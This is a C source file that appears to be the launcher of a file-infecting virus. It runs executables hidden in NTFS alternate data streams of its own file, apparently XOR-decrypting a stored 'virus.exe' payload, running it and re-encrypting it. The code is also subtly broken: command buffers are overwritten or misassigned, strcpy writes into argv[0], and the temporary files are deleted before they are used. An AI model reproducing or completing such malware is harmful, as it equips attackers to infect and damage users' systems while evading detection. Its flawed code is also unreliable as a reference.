#include <stdio.h>

int main(int argc, char *argv[]){
    char *infected_file = argv[0]; 
    
    char *checkname = strrchr(infected_file,'\\');
    if(checkname != NULL){            
               strcpy(infected_file, checkname+1);       
    }
    
    char command1[50], command2[50], command3[50], command4[50], command5[50], command6[50];
    
    snprintf(command1, sizeof(command1), "start /b ./%s:CS.exe %s:virus.exe tmp.exe", infected_file, infected_file); 
    snprintf(command2, sizeof(command2), "start /b ./%s:xorcipher.exe tmp.exe tmp2.exe %s", infected_file, infected_file); 
    snprintf(command3, sizeof(command3), "start /b ./%s:CS.exe tmp2.exe %s:virus.exe", infected_file, infected_file); 
    snprintf(command5, sizeof(command4), "start /b ./%s:virus.exe %s", infected_file, infected_file);
    snprintf(command5, sizeof(command5), "start /b ./%s:CS.exe tmp.exe %s:virus.exe", infected_file, infected_file);
    snprintf(command4, sizeof(command6), "del tmp.exe tmp2.exe");
    
    system(command1);
    system(command2);
    system(command3);
    system(command4);
    system(command5);
    
}
